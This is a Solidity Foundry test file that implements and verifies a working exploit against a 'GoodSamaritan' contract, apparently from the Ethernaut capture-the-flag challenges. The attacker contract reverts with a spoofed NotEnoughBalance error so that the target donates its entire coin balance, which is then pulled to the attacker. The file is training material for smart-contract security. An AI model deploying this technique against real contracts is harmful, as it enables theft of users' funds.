// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Good.sol";

interface ERC20Like {
    function transfer(address, uint256) external;
    
    function balances(address) external view returns (uint256);
}

contract Exploit is Test {
    error NotEnoughBalance();

    fallback(bytes calldata data) external returns (bytes memory) {
        uint256 bal;
        
        assembly {
            bal := calldataload(0x04)
        }
        
        if (bal == 10) {
            revert NotEnoughBalance();
        }
    }
    
    function askCoins(address gs) external {
        gs.call(abi.encodeWithSignature("requestDonation()"));
    }
    
    function pullCoins(address token) external {
        ERC20Like tok = ERC20Like(token);
        tok.transfer(msg.sender, tok.balances(address(this)));
    }
}

contract ExploitTest is Test {
    GoodSamaritan public gs;
    
    address attacker = address(uint160(uint256(keccak256("attacker"))));

    function setUp() public {
       gs = new GoodSamaritan();
    }
    
    function testExploit() public {
        vm.startPrank(attacker);

        assertEq(gs.coin().balances(attacker), 0);
        
        Exploit ex = new Exploit();
        ex.askCoins(address(gs));
        assertEq(gs.coin().balances(address(ex)), 10**6);
        ex.pullCoins(address(gs.coin()));
        
        assertEq(gs.coin().balances(attacker), 10**6);
    }
}
